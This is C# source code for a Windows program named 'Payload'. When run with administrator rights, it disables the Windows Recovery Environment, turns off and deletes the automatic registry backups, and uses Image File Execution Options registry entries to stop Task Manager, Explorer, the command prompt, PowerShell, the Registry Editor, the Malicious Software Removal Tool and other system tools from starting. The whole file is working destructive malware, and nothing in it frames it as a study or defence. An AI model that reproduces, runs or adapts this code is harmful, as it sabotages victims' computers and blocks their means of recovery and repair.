// (c) 2022 BlindEye Softworks. All rights reserved under MIT license.

using System;
using System.IO;
using System.Collections;
using System.Diagnostics;
using System.Collections.Generic;
using System.Security.Principal;
using Microsoft.Win32;

namespace Payload
{
    public sealed class Program
    {
        private static readonly ImmutableArray<string> systemPrograms =
            new ImmutableArray<string>
            (
                "cmd",            // Command Prompt
                "explorer",       // Windows Explorer
                "mmc",            // Microsoft Management Console
                "mrt",            // Malicious Software Removal Tool
                "msconfig",       // Microsoft System Configuration
                "notepad",        // Notepad
                "powershell",     // Powershell
                "powershell_ise", // Powershell Integrated Scripting Environment
                "regedit",        // Registry Editor
                "taskmgr",        // Task Manager
                "write",          // Wordpad
                "wordpad"         // Wordpad
            );

        static void Main()
        {
            if (!IsElevatedProcess())
                Environment.Exit(5);

            if (systemPrograms.Count < 1)
                Environment.Exit(13);

            DisableWindowsRecoveryEnvironment();
            DisableAutomaticRegistryBackups();
            PurgeRegBackFolder();
            DisableProcesses();

            Environment.Exit(259);
        }

        private static bool IsElevatedProcess()
        {
            try
            {
                return new WindowsPrincipal(WindowsIdentity.GetCurrent())
                    .IsInRole(WindowsBuiltInRole.Administrator);
            }
            catch (System.Security.SecurityException)
            {
                return false;
            }
        }

        private static void DisableWindowsRecoveryEnvironment()
        {
            var reagentcStartInfo = new ProcessStartInfo
            {
                FileName = "reagentc",
                Arguments = "/disable",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            };

            try
            {
                var reagentc = Process.Start(reagentcStartInfo);
                reagentc.WaitForExit();
            }
            catch (Exception)
            {
                return;
            }
        }

        private static void DisableAutomaticRegistryBackups()
        {
            // Windows 10 version 1803 and later have automatic registry hive
            // backups disabled by default to decrease overall disk footprint
            // size of Windows.
            var subKey = @"SYSTEM\CurrentControlSet\Control\Session Manager\Configuration Manager";

            try
            {
                var key = Registry.LocalMachine.OpenSubKey(subKey, true);

                if (key != null)
                {
                    key.DeleteValue("EnablePeriodicBackup");
                    key.Close();
                }
            }
            catch (Exception)
            {
                return;
            }
        }

        private static void PurgeRegBackFolder()
        {
            var regBackPath = Path.Combine(Environment.SystemDirectory,
                @"config\RegBack");

            if (Directory.Exists(regBackPath))
                foreach (var file in Directory.GetFiles(regBackPath))
                    try
                    {
                        File.Delete(file);
                    }
                    catch (Exception)
                    {
                        continue;
                    }
        }

        private static void DisableProcesses()
        {
            foreach (var program in systemPrograms)
            {
                if (string.IsNullOrWhiteSpace(program) ||
                    !program.IsValidFilename())
                    continue;

                var subKey = string.Format(
                    @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\{0}{1}",
                    program, ".exe");

                try
                {
                    using (var key = Registry.LocalMachine.CreateSubKey(subKey))
                    {
                        if (key != null)
                            key.SetValue("Debugger", "null", RegistryValueKind.String);
                    }
                }
                catch (Exception)
                {
                    continue;
                }
            }
        }
    }

    public static class StringExtensions
    {
        public static bool IsValidFilename(this string str)
        {
            var illegalChars = Path.GetInvalidFileNameChars();

            for (int i = 0; i < illegalChars.Length; i++)
                if (str.Contains(illegalChars[i].ToString()))
                    return false;

            return true;
        }
    }

    public sealed class ImmutableArray<T> : IReadOnlyCollection<T>
    {
        private readonly T[] array;

        public int Count => (array != null) ? array.Length : 0;

        public T this[int index] => array[index];

        public ImmutableArray(params T[] items) => array = items;

        public IEnumerator<T> GetEnumerator() =>
            (array as IEnumerable<T>).GetEnumerator();

        IEnumerator IEnumerable.GetEnumerator() => GetEnumerator();
    }
}
